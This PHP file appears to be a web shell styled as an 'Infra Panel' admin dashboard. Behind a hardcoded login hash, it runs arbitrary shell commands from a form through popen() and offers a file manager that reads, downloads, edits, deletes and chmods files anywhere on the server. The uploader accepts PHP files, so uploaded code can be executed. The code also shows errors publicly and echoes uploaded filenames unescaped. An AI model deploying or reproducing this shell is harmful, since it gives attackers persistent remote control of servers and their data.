<?php
session_start();

/****************** CONFIG ******************/
const AUTH_USER = 'Infra';
const AUTH_HASH = '$2a$10$3xRPyuUE5yl3XijUDhv88uYJAktHBJhfylFpRz5ez7eKfkUrQxJAi';
const MAX_EDIT_BYTES = 512*1024;
const MAX_UPLOAD_BYTES = 2*1024*1024; // 2MB
$ALLOWED_EXT = ['txt','php','jpg','jpe','7z'];
/********************************************/

ini_set('display_errors',1);
ini_set('display_startup_errors',1);
error_reporting(E_ALL);

// ------------------- AUTH -------------------
$loginError = '';
if (!isset($_SESSION['authed']) || $_SESSION['authed']!==true) {
    if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['user'],$_POST['password'])) {
        if (hash_equals(AUTH_USER,$_POST['user']) && password_verify($_POST['password'],AUTH_HASH)) {
            $_SESSION['authed']=true;
            $_SESSION['csrf']=bin2hex(random_bytes(24));
            header('Location: '.$_SERVER['PHP_SELF']);
            exit;
        } else { $loginError='Invalid credentials'; }
    }
    echo '<!doctype html><meta charset="utf-8"><title>Login</title>
    <style>body{background:#081018;color:#e6eef6;font-family:system-ui,Segoe UI,Roboto;display:grid;place-items:center;height:100vh;margin:0}
    .card{background:#0f1722;padding:20px;border-radius:10px;border:1px solid #233;width:360px}
    input{width:100%;padding:10px;margin:8px 0;border-radius:8px;border:1px solid #233;background:#061222;color:#e6eef6}
    button{padding:10px 14px;border-radius:8px;border:1px solid #233;background:#123;color:#e6eef6;cursor:pointer}
    .err{color:#ff7b7b;margin-bottom:8px}</style>
    <div class="card"><h2>Panel Login</h2>';
    if ($loginError) echo '<div class="err">'.htmlspecialchars($loginError).'</div>';
    echo '<form method="post"><input name="user" placeholder="Username" value="'.htmlspecialchars(AUTH_USER).'"><input name="password" type="password" placeholder="Password"><div style="height:8px"></div><button>Login</button></form></div>';
    exit;
}
if (isset($_POST['logout'])) { session_destroy(); header('Location: '.$_SERVER['PHP_SELF']); exit; }

// ------------------- HELPERS -------------------
function csrf_token(): string { return $_SESSION['csrf'] ?? $_SESSION['csrf']=bin2hex(random_bytes(24)); }
function check_csrf($t): bool { return isset($_SESSION['csrf']) && hash_equals($_SESSION['csrf'], (string)$t); }
function joinPath($a,$b){return rtrim($a,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.ltrim($b,DIRECTORY_SEPARATOR);}
function normalizePath($p){$r=@realpath($p);return $r===false?'':$r;}
function humanSize($b){$u=['B','KB','MB','GB','TB'];$i=0;while($b>=1024&&$i<count($u)-1){$b/=1024;$i++;}return($i?number_format($b,2):$b).' '.$u[$i];}
function permString($path){$p=@fileperms($path);if($p===false)return'N/A';$t=($p&0x4000)?'d':'-';$m=[0x0100,0x0080,0x0040,0x0020,0x0010,0x0008,0x0004,0x0002,0x0001];$str='';foreach($m as $i=>$bit)$str.=($p&$bit)?'rwxrwxrwx'[$i]:'-';return $t.$str;}
function ownerGroup($path){if(function_exists('posix_getpwuid') && function_exists('posix_getgrgid')){$uid=@fileowner($path);$gid=@filegroup($path);$u=$uid!==false?(@posix_getpwuid($uid)['name']??$uid):'?';$g=$gid!==false?(@posix_getgrgid($gid)['name']??$gid):'?';return $u.':'.$g;} return 'N/A';}
function sanitizeFilename($name){$n=basename($name);$n=preg_replace('/[^\w\-. ]+/u','_',$n);if($n===''||$n==='.'||$n==='..')$n='file_'.bin2hex(random_bytes(4));return $n;}
function build_breadcrumbs($path){$parts=explode('/',trim($path,'/'));$acc='';$out=[['label'=>'/','href'=>'?tab=files&p=/']];foreach($parts as $p){if($p==='')continue;$acc.='/'.$p;$out[]=['label'=>$p,'href'=>'?tab=files&p='.urlencode($acc)];}return $out;}

// ------------------- STATE -------------------
$tab = $_GET['tab'] ?? 'info';
$rel = $_GET['p'] ?? __DIR__;
$rel = rtrim($rel,'/');
$current = normalizePath($rel ?: __DIR__);

// ------------------- DOWNLOAD HANDLER -------------------
if($tab==='files' && isset($_GET['dl']) && is_file($current) && is_readable($current)) {
    $filename = basename($current);
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.$filename.'"');
    header('Content-Transfer-Encoding: binary');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: '.filesize($current));
    readfile($current);
    exit;
}

// ------------------- COMMAND EXECUTOR -------------------
$exec_output='';
if($tab==='exec' && isset($_POST['cmd'])){
    $cmd=$_POST['cmd'];
    $h=@popen($cmd,'r');
    if($h){while(!feof($h)) $exec_output.=fgets($h); pclose($h);}
    else $exec_output="Unable to run command.";
}

// ------------------- FILES -------------------
$notice=''; $items=[];
if($tab==='files'){
    // save edit
    if($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['savefile'],$_POST['save_csrf']) && check_csrf($_POST['save_csrf'])){
        if(is_file($current) && is_readable($current) && is_writable($current)){
            $content=$_POST['savefile'];
            if(strlen($content)<=MAX_EDIT_BYTES){@file_put_contents($current,$content);$notice='File saved.';} else $notice='File too large.';
        } else $notice='File not writable or unreadable.';
    }

    // custom upload
    if($_SERVER['REQUEST_METHOD']==='POST' && isset($_FILES['fileup'])){
        $f = $_FILES['fileup'];
        $ext = strtolower(pathinfo($f['name'], PATHINFO_EXTENSION));
        list($fw,$fh) = @getimagesize($f['tmp_name']) ?: [0,0];
        $e = (!in_array($ext, $ALLOWED_EXT) ? "Bad type. " : '') .
             ($f['size'] > MAX_UPLOAD_BYTES ? "Too big. " : '') .
             ($fw >= 900 || $fh >= 800 ? "Too wide/tall. " : '');
        $dest = joinPath($current, sanitizeFilename($f['name']));
        if(!$e && move_uploaded_file($f['tmp_name'],$dest)) {
            @chmod($dest,0644);
            $notice = "Uploaded <b>{$f['name']}</b><br>Type: {$f['type']}<br>Size: ".round($f['size']/1024,1)."KB" .
                      ($fw?"<br>Size: {$fw}x{$fh}":'') .
                      "<br>URL: http://{$_SERVER['HTTP_HOST']}".dirname($_SERVER['REQUEST_URI'])."/{$f['name']}";
        } else $notice = $e ?: "Upload failed.";
    }
// ------------------- FILE ACTIONS -------------------
	if($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['action_csrf']) && check_csrf($_POST['action_csrf'])){
		$target = normalizePath($_POST['target'] ?? '');
		$action = $_POST['action'] ?? '';
		if($target && strpos($target, realpath($current))===0){ // ensure target is inside current
			switch($action){
				case 'delete':
					if(is_file($target)){ @unlink($target); $notice="File deleted."; }
					elseif(is_dir($target)){ @rmdir($target); $notice="Directory deleted (must be empty)."; }
					else $notice="Cannot delete."; break;
				case 'chmod':
					$perm = $_POST['perm'] ?? '';
					if(preg_match('/^[0-7]{3,4}$/',$perm)){ @chmod($target, octdec($perm)); $notice="Permissions changed."; }
					else $notice="Invalid permissions."; break;
				case 'rename':
					$newname = sanitizeFilename($_POST['newname'] ?? '');
					if($newname && dirname($target) && @rename($target, joinPath(dirname($target),$newname))) $notice="Renamed to $newname";
					else $notice="Rename failed.";
					break;
				case 'mkdir':
					$newname = sanitizeFilename($_POST['newname'] ?? '');
					if($newname && @mkdir(joinPath($current,$newname))) $notice="Directory created: $newname";
					else $notice="Failed to create directory.";
					break;
			}
		}
	}

    // listing
	$filter = $_GET['filter'] ?? '';
	$items = [];
	if(is_dir($current)){
		$dh=@opendir($current);
		if($dh){
			while(($f=readdir($dh))!==false){
				if($f==='.') continue;
				$full=joinPath($current,$f);
				$items[]=[
					'name'=>$f,
					'isDir'=>is_dir($full),
					'size'=>is_dir($full)?0:@filesize($full),
					'mtime'=>@filemtime($full),
					'perm'=>permString($full),
					'own'=>ownerGroup($full),
					'rel'=>$full
				];
			}
			closedir($dh);
		}
		// Apply search/filter
		if($filter!==''){
			$items = array_filter($items, function($it) use($filter){
				return stripos($it['name'], $filter)!==false;
			});
		}
		// Sort: directories first, then files alphabetically
		usort($items,function($a,$b){
			if($a['isDir']!==$b['isDir']) return $a['isDir']?-1:1;
			return strnatcasecmp($a['name'],$b['name']);
		});
	}

}

// ------------------- EDIT / VIEW -------------------
function isTextLike($path){
    if(!is_file($path) || !is_readable($path)) return false;
    $text_ext = ['txt','log','csv','json','xml','md','conf','ini','php'];
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION) ?: '');
    return in_array($ext, $text_ext, true);
}

$viewFile=false; $editFile=false; $fileContent='';
if($tab==='files' && file_exists($current)) {
    if(isset($_GET['view']) && is_file($current) && is_readable($current)) $viewFile=true;
    if(isset($_GET['edit']) && is_file($current) && is_readable($current) && filesize($current)<=MAX_EDIT_BYTES && isTextLike($current)){
        $editFile=true;
        $fileContent=@file_get_contents($current);
        if($fileContent===false) $fileContent="Unable to read file (permission?).";
    }
}
?><!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Infra Panel</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{margin:0;background:#071018;color:#e6eef6;font:14px/1.4 system-ui,Segoe UI,Roboto}
.nav{display:flex;gap:8px;padding:12px;background:#0e1720;border-bottom:1px solid #1e2a33;align-items:center}
.nav a{color:#e6eef6;text-decoration:none;padding:8px 12px;border-radius:8px}
.nav a.active{background:#14242d}
.container{max-width:1200px;margin:18px auto;padding:16px}
.card{background:#0d1620;padding:14px;border-radius:8px;border:1px solid #1e2a33}
.btn{padding:8px 12px;border-radius:6px;background:#153;border:none;color:#e6eef6;cursor:pointer}
.table{width:100%;border-collapse:collapse;margin-top:12px}
.table th,.table td{padding:8px;border-bottom:1px solid #1e2a33;text-align:left}
.small{color:#9aa6b2;font-size:13px}
.notice{padding:10px;background:#0b1a1f;border:1px solid #123;margin-bottom:10px}
.pre{background:#041018;padding:12px;border-radius:6px;overflow:auto}
.breadcrumb{display:flex;gap:6px;align-items:center;flex-wrap:wrap;margin-bottom:10px}
.breadcrumb a{color:#e6eef6;text-decoration:none;padding:6px 8px;background:#0b1720;border-radius:6px;border:1px solid #1e2a33}
textarea{width:100%;background:#041018;color:#e6eef6;padding:10px;border-radius:6px;border:1px solid #1e2a33;font-family:monospace;font-size:13px}
input[type=file]{color:#e6eef6}
</style>
</head>
<body>
<div class="nav">
  <a href="?tab=info" class="<?= $tab==='info'?'active':'' ?>">General Information</a>
  <a href="?tab=exec" class="<?= $tab==='exec'?'active':'' ?>">Command Executor</a>
  <a href="?tab=files" class="<?= $tab==='files'?'active':'' ?>">File Manager</a>
  <form method="post" style="margin-left:auto"><input type="hidden" name="logout" value="1"><button class="btn">Logout</button></form>
</div>
<div class="container">

<?php if($tab==='info'): ?>
  <div class="card"><h2>General Information</h2>
  <ul>
    <li><strong>OS:</strong> <?=htmlspecialchars(php_uname())?></li>
    <li><strong>PHP Version:</strong> <?=htmlspecialchars(phpversion())?></li>
    <li><strong>User:</strong> <?=htmlspecialchars(get_current_user().' UID:'.getmyuid().' GID:'.getmygid())?></li>
    <li><strong>Server Software:</strong> <?=htmlspecialchars($_SERVER['SERVER_SOFTWARE']??'N/A')?></li>
    <li><strong>Server IP:</strong> <?=htmlspecialchars($_SERVER['SERVER_ADDR']??gethostbyname(gethostname()))?></li>
    <li><strong>Your IP:</strong> <?=htmlspecialchars($_SERVER['REMOTE_ADDR']??'N/A')?></li>
    <li class="small">Keep this panel private. Use TLS + IP allowlist.</li>
  </ul></div>

<?php elseif($tab==='exec'): ?>
  <div class="card">
    <h2>Command Executor</h2>
    <form method="post"><input name="cmd" placeholder="ls -la /etc" style="width:70%"><button style="margin-left:8px">Run</button></form>
    <?php if($exec_output!==''): ?><h3>Output</h3><pre class="pre"><?=htmlspecialchars($exec_output)?></pre><?php endif; ?>
  </div>

<?php elseif($tab==='files'): ?>
  <div class="card"><h2>File Manager — Current: <?=htmlspecialchars($current)?></h2>
    <?php if($notice) echo '<div class="notice">'.$notice.'</div>'; ?>
    <div class="breadcrumb"><?php foreach(build_breadcrumbs($current) as $i=>$c){echo '<a href="'.htmlspecialchars($c['href']).'">'.htmlspecialchars($c['label']).'</a>'; if($i<count(build_breadcrumbs($current))-1)echo'<span class="small">/</span>';} ?></div>

<?php if($editFile): ?>
  <form method="post"><input type="hidden" name="save_csrf" value="<?=htmlspecialchars(csrf_token())?>">
  <h3>Editing: <?=htmlspecialchars(basename($current))?></h3>
  <textarea name="savefile" rows="20"><?=htmlspecialchars($fileContent)?></textarea>
  <div style="height:8px"></div><button>Save</button></form>

<?php elseif($viewFile): ?>
  <h3>Viewing: <?=htmlspecialchars(basename($current))?></h3>
  <pre class="pre"><?=htmlspecialchars(@file_get_contents($current)?:'Unable to read file.')?></pre>
  <div style="height:8px"></div>
  <a href="?tab=files&p=<?=urlencode(dirname($current))?>">Back</a> | <a href="?tab=files&p=<?=urlencode($current)?>&dl=1">Download</a>

<?php elseif(is_dir($current)): ?>
  <form method="get" style="margin-bottom:12px"><input type="hidden" name="tab" value="files"><input name="p" placeholder="Path" value="<?=htmlspecialchars($rel)?>" style="width:360px"><button>Go</button></form>
  <table class="table"><thead><tr><th>Name</th><th>Size</th><th>Modified</th><th>Perms</th><th>Owner</th><th>Actions</th></tr></thead><tbody>
  <?php if($rel!==''): ?><tr><td>📁 <a href="?tab=files&p=<?=urlencode(dirname($current))?>">.. (parent)</a></td><td>—</td><td>—</td><td>—</td><td>—</td><td>—</td></tr><?php endif; ?>
  <?php foreach($items as $it): ?>
	<tr>
		<td><?= $it['isDir']?'📁':'📄' ?> <a href="?tab=files&p=<?=urlencode($it['rel'])?>"><?=htmlspecialchars($it['name'])?></a></td>
		<td><?= $it['isDir']?'—':htmlspecialchars(humanSize((int)$it['size'])) ?></td>
		<td><?=date('Y-m-d H:i:s',$it['mtime'])?></td>
		<td><?=htmlspecialchars($it['perm'])?></td>
		<td><?=htmlspecialchars($it['own'])?></td>
		<td>
		<?php if(!$it['isDir']): ?>
			<a href="?tab=files&p=<?=urlencode($it['rel'])?>&view=1">View</a> |
			<a href="?tab=files&p=<?=urlencode($it['rel'])?>&edit=1">Edit</a> |
			<a href="?tab=files&p=<?=urlencode($it['rel'])?>&dl=1">Download</a> |
			<form method="post" style="display:inline">
				<input type="hidden" name="action_csrf" value="<?=htmlspecialchars(csrf_token())?>">
				<input type="hidden" name="target" value="<?=htmlspecialchars($it['rel'])?>">
				<input type="hidden" name="action" value="delete">
				<button class="btn" style="padding:2px 6px">Delete</button>
			</form> |
			<form method="post" style="display:inline">
				<input type="hidden" name="action_csrf" value="<?=htmlspecialchars(csrf_token())?>">
				<input type="hidden" name="target" value="<?=htmlspecialchars($it['rel'])?>">
				<input type="hidden" name="action" value="chmod">
				<input name="perm" size="4" placeholder="644">
				<button class="btn" style="padding:2px 6px">Chmod</button>
			</form> |
			<form method="post" style="display:inline">
				<input type="hidden" name="action_csrf" value="<?=htmlspecialchars(csrf_token())?>">
				<input type="hidden" name="target" value="<?=htmlspecialchars($it['rel'])?>">
				<input type="hidden" name="action" value="rename">
				<input name="newname" size="10" placeholder="New name">
				<button class="btn" style="padding:2px 6px">Rename</button>
			</form>
		<?php else: ?>
			<form method="post" style="display:inline">
				<input type="hidden" name="action_csrf" value="<?=htmlspecialchars(csrf_token())?>">
				<input type="hidden" name="target" value="<?=htmlspecialchars($it['rel'])?>">
				<input type="hidden" name="action" value="mkdir">
				<input name="newname" size="10" placeholder="New folder">
				<button class="btn" style="padding:2px 6px">MkDir</button>
			</form>
		<?php endif; ?>
		</td>
	</tr>
  <?php endforeach; if(empty($items)) echo '<tr><td colspan="6" class="small">Empty directory</td></tr>'; ?>
  </tbody></table>

  <h4>Upload file</h4>
  <form method="post" enctype="multipart/form-data" style="text-align:center;margin:1em;">
    <input type="file" name="fileup"><br>
    <input type="submit" value="Upload">
    <div class="small">Allowed: <?=htmlspecialchars(implode(', ',$ALLOWED_EXT))?> — Max 2MB, images ≤900x800</div>
  </form>

<?php else: ?><div class="small">Invalid path or not a directory.</div><?php endif; ?>
  </div>
<?php endif; ?>
</div></body></html>
